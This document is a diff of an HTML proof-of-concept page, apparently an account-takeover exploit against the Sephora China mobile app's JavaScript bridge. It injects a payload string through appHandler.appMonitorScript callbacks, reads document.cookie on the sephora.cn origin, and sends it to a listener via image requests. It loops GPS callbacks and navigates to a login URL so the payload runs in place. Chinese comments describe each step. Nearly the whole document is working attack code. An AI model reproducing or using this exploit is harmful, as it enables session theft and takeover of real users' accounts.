@@ -1,33 +1,27 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>ATO-v5</title></head>
+<title>ATO-v6</title></head>
 <body style="background:#111;color:#0f0;font-family:monospace;padding:16px;font-size:13px">
-<h3 style="color:#c9a96e">ATO v5 (login in-place)</h3>
+<h3 style="color:#c9a96e">ATO v6 (https login in-place)</h3>
 <div id="log"></div>
 <script>
 window.sep={_onSuccess:function(){},_onFailure:function(){},_onCancel:function(){}};
 function L(s){document.getElementById('log').innerHTML+=s+'<br>'}
 function B(t,d){new Image().src='http://127.0.0.1:8899/x?t='+t+'&d='+encodeURIComponent(d||'').substring(0,650)}
 
-// 载荷: 落在哪读哪; sephora源→WIN(偷cookie+横幅); 否则记录origin
-window.__p="0);(function(){var c=document.cookie,o=location.origin;if(o.indexOf('sephora.cn')>=0){new Image().src='http://127.0.0.1:8899/x?t=WIN&d='+encodeURIComponent(o+'|||'+c.substring(0,600));try{var d=document.createElement('div');d.style.cssText='position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#c00;color:#fff;padding:14px;font:700 13px monospace;word-break:break-all';d.textContent='ATO-WIN('+c.length+'): '+c.substring(0,160);document.body.appendChild(d)}catch(e){}return}if(!window.__n)window.__n=0;window.__n++;new Image().src='http://127.0.0.1:8899/x?t=cb'+window.__n+'&d='+encodeURIComponent(o);if(window.__n<25){try{appHandler.appMonitorScript('getGPS',window.__p,'{}')}catch(e){}}})();//";
+window.__p="0);(function(){var c=document.cookie,o=location.origin;if(o.indexOf('sephora.cn')>=0){new Image().src='http://127.0.0.1:8899/x?t=WIN&d='+encodeURIComponent(o+'|||'+c.substring(0,600));try{var d=document.createElement('div');d.style.cssText='position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#c00;color:#fff;padding:14px;font:700 13px monospace;word-break:break-all';d.textContent='ATO-WIN('+c.length+'): '+c.substring(0,160);document.body.appendChild(d)}catch(e){}return}if(!window.__n)window.__n=0;window.__n++;new Image().src='http://127.0.0.1:8899/x?t=cb'+window.__n+'&d='+encodeURIComponent(o);if(window.__n<20){try{appHandler.appMonitorScript('getGPS',window.__p,'{}')}catch(e){}}})();//";
 
 B('load',location.href);L('page loaded');
 if(typeof appHandler==='undefined'){L('NO bridge');B('nobridge','')}
 else{
-  L('bridge OK');
-  // 载体1: shareApp面板 (登录回来后 取消它)
-  appHandler.appMonitorScript('shareApp',window.__p,'{"title":"t","content":"c","shareUrl":"https://m.sephora.cn/"}');
-  L('1. shareApp armed — 面板弹出,先别动');
-  // 载体2: GPS循环 (若Java侧监听器存活,页面死后仍fire)
+  L('bridge OK, arming carriers...');
   appHandler.appMonitorScript('getGPS',window.__p,'{}');
-  L('2. GPS armed');
+  appHandler.appMonitorScript('getGPS',window.__p,'{}');
+  appHandler.appMonitorScript('shareApp',window.__p,'{"title":"t","content":"c","shareUrl":"https://m.sephora.cn/"}');
+  L('armed (GPSx2+shareApp)');
   var hb=0;setInterval(function(){B('hb',''+(++hb))},2000);
-
-  // t=2.5s: 登录流 → 原地加载 sephora 页
-  setTimeout(function(){
-    L('3. 触发登录流...');
-    B('nav-start','');
-    location.href='sephora://account/login?webLoginTarget='+encodeURIComponent('https://m.sephora.cn/myAccount');
-  },2500);
+  // 直接触发(不用setTimeout): https形式login URL → SOL redirect分支 → return false → 原地加载sephora源
+  B('nav','');
+  L('nav -> https login url (in-place)');
+  location.href='https://m.sephora.cn/app/login?historyLocation='+encodeURIComponent('https://m.sephora.cn/');
 }
 </script></body></html>
